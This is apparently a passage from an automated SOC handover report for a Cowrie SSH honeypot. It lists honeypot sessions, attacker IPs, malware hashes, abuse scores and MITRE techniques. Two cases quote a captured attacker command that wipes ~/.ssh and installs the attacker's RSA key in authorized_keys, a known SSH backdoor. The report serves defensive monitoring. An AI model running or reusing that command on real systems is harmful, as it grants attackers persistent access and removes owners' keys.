- [ ] Submit `94.29.124[.]154` to AbuseIPDB if not already reported
- [ ] Block `94.29.124[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a7b612634cd

| Field | Detail |
|---|---|
| **Source IP** | `94.29.124[.]154` |
| **First Seen** | 2026-05-08 17:54 |
| **Last Seen** | 2026-05-08 17:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 17:54:53` | `cowrie.session.connect` |
| `2026-05-08 17:54:53` | `cowrie.client.version` |
| `2026-05-08 17:54:53` | `cowrie.client.kex` |
| `2026-05-08 17:54:55` | `cowrie.login.success` |
| `2026-05-08 17:54:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.29.124[.]154` to AbuseIPDB if not already reported
- [ ] Block `94.29.124[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7cd423b9aac

| Field | Detail |
|---|---|
| **Source IP** | `180.184.38[.]93` |
| **First Seen** | 2026-05-08 18:24 |
| **Last Seen** | 2026-05-08 18:24 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 18:24:39` | `cowrie.session.connect` |
| `2026-05-08 18:24:39` | `cowrie.client.version` |
| `2026-05-08 18:24:39` | `cowrie.client.kex` |
| `2026-05-08 18:24:39` | `cowrie.login.success` |
| `2026-05-08 18:24:40` | `cowrie.session.params` |
| `2026-05-08 18:24:40` | `cowrie.command.input` |
| `2026-05-08 18:24:40` | `cowrie.command.failed` |
| `2026-05-08 18:24:40` | `cowrie.log.closed` |
| `2026-05-08 18:24:40` | `cowrie.session.params` |
| `2026-05-08 18:24:40` | `cowrie.command.input` |
| `2026-05-08 18:24:40` | `cowrie.session.file_download` |
| `2026-05-08 18:24:40` | `cowrie.log.closed` |
| `2026-05-08 18:24:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.38[.]93` to AbuseIPDB if not already reported
- [ ] Block `180.184.38[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d73e25d2d48f

| Field | Detail |
|---|---|
| **Source IP** | `180.184.38[.]93` |
| **First Seen** | 2026-05-08 18:24 |
| **Last Seen** | 2026-05-08 18:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 18:24:47` | `cowrie.session.connect` |
| `2026-05-08 18:24:47` | `cowrie.client.version` |
| `2026-05-08 18:24:47` | `cowrie.client.kex` |
| `2026-05-08 18:24:48` | `cowrie.login.success` |
| `2026-05-08 18:24:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.38[.]93` to AbuseIPDB if not already reported
- [ ] Block `180.184.38[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8877b10b670a

| Field | Detail |
|---|---|
| **Source IP** | `27.50.25[.]190` |
| **First Seen** | 2026-05-08 18:31 |
| **Last Seen** | 2026-05-08 18:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 18:31:26` | `cowrie.session.connect` |
| `2026-05-08 18:31:26` | `cowrie.client.version` |
| `2026-05-08 18:31:26` | `cowrie.client.kex` |
| `2026-05-08 18:31:27` | `cowrie.login.success` |
| `2026-05-08 18:31:27` | `cowrie.session.params` |
| `2026-05-08 18:31:27` | `cowrie.command.input` |
| `2026-05-08 18:31:27` | `cowrie.command.failed` |
| `2026-05-08 18:31:27` | `cowrie.log.closed` |
| `2026-05-08 18:31:27` | `cowrie.session.params` |
| `2026-05-08 18:31:27` | `cowrie.command.input` |
| `2026-05-08 18:31:27` | `cowrie.session.file_download` |
| `2026-05-08 18:31:27` | `cowrie.log.closed` |
| `2026-05-08 18:31:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.50.25[.]190` to AbuseIPDB if not already reported
- [ ] Block `27.50.25[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2dda8b9d98d

| Field | Detail |
|---|---|
| **Source IP** | `27.50.25[.]190` |
| **First Seen** | 2026-05-08 18:31 |
| **Last Seen** | 2026-05-08 18:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 18:31:29` | `cowrie.session.connect` |
| `2026-05-08 18:31:29` | `cowrie.client.version` |
| `2026-05-08 18:31:29` | `cowrie.client.kex` |
| `2026-05-08 18:31:29` | `cowrie.login.success` |
| `2026-05-08 18:31:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.50.25[.]190` to AbuseIPDB if not already reported
- [ ] Block `27.50.25[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `27.50.25[.]190` | **30** | 2026-05-08 17:22 | 2026-05-08 18:39 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `43.135.135[.]17` | **29** | 2026-05-08 17:41 | 2026-05-08 18:03 | 0m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.184.38[.]93` | **26** | 2026-05-08 18:08 | 2026-05-08 18:32 | 40m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `217.154.38[.]181` | **21** | 2026-05-08 17:23 | 2026-05-08 18:00 | 0m | 21 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `123.139.116[.]220` | **6** | 2026-05-08 17:23 | 2026-05-08 17:25 | 10m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `172.202.117[.]179` | **2** | 2026-05-08 19:23 | 2026-05-08 19:23 | 0m | 0 | `T1592` | 🟢 LOW |
| `121.227.152[.]171` | 1 | 2026-05-08 18:07 | 2026-05-08 18:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `158.178.141[.]16` | 1 | 2026-05-08 17:52 | 2026-05-08 17:52 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `171.104.143[.]176` | 1 | 2026-05-08 18:08 | 2026-05-08 18:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.115[.]202` | 1 | 2026-05-08 18:13 | 2026-05-08 18:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `49.84.226[.]19` | 1 | 2026-05-08 18:20 | 2026-05-08 18:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `87.65.169[.]190` | 1 | 2026-05-08 18:25 | 2026-05-08 18:25 | 2s | 0 | `T1592` | 🟢 LOW |
| `94.29.124[.]154` | 1 | 2026-05-08 17:54 | 2026-05-08 17:54 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `49.84.226[.]19` | CN | CHINANET jiangsu province network | **100** ⚠️ | 7 |
| `180.76.115[.]202` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `158.178.141[.]16` | AU | Oracle Corporation | **100** ⚠️ | 50 |
| `43.135.135[.]17` | US | Asia Pacific Network Information Center, Pty. Ltd. | **100** ⚠️ | 8 |
| `121.227.152[.]171` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `94.29.124[.]154` | RU | Moscow Local Telephone Network (OAO MGTS) | **100** ⚠️ | 11 |
| `27.50.25[.]190` | ID | PT. Mora Telematika Indonesia | **100** ⚠️ | 50 |
| `171.104.143[.]176` | CN | CHINANET GUANGXI PROVINCE NETWORK | **100** ⚠️ | 50 |
| `123.139.116[.]220` | CN | China Unicom Shannxi province network | **100** ⚠️ | 50 |
| `180.184.38[.]93` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 134 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 88 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 18 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 9 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 9 |

---

## 🔕 False Positive Summary (36 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 34 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 175 cases |
| Tool 34  | Credential Extractor        | ✅ 106 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 25 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 36 filtered (20.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 22 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 18 priority case(s) shown individually · 13 recon entry/entries in table (6 group(s) consolidating 114 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-08T19:24:46Z_
